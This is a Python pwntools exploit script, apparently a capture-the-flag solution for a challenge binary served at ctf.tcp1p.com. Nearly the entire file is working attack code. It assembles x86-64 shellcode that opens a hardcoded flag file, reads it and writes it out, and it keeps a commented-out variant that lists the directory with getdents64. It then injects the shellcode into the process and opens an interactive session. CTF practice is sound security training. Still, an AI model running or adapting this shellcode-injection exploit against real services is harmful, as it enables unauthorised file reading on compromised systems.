#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./chall", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc ctf.tcp1p.com 8008"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

# print(shellcraft.amd64.linux.open(
#     "flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt"))

"""
Use `getdents64` to list cwd and get flag file name

rax = open(".", O_RDONLY);
char buf[1024];
getdents64(rax, buf, sizeof(buf))
write(1, buf, sizeof(buf))
"""
# sc = """
# push 0x66
# mov rax, 0x74632f656d6f682f
# push rax
# mov rdi, rsp
# xor edx, edx
# xor esi, esi
# push 2
# pop rax
# syscall

# mov rdi, rax
# sub rsp, 0x400
# mov rsi, rsp
# push 0x400
# pop rdx
# push 217
# pop rax
# syscall

# mov rdi, 1
# push 0x400
# pop rdx
# push rsp
# pop rsi
# push 1
# pop rax
# syscall
# """

"""
rax = open("flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt", O_RDONLY);
char buf[40];
read(rax, buf, sizeof(buf))
write(1, buf, sizeof(buf))
"""
sc = """
push 0x74
mov rax, 0x78742e3039656536
push rax
mov rax, 0x3538396663313736
push rax
mov rax, 0x3463666233346531
push rax
mov rax, 0x6430353662386462
push rax
mov rax, 0x3238613238346464
push rax
mov rax, 0x3032346365346338
push rax
mov rax, 0x3133386430636362
push rax
mov rax, 0x3165386631306432
push rax
mov rax, 0x3634332d67616c66
push rax
mov rdi, rsp
xor edx, edx
xor esi, esi
push 2
pop rax
syscall

mov rdi, rax
sub rsp, 0x40
push rsp
pop rsi
mov rdx, 0x40
push 0
pop rax
syscall

mov rdx, rax
mov rdi, 1
push rsp
pop rsi
push 1
pop rax
syscall
"""
sc = asm(sc)
io.sendline(sc)

io.interactive()
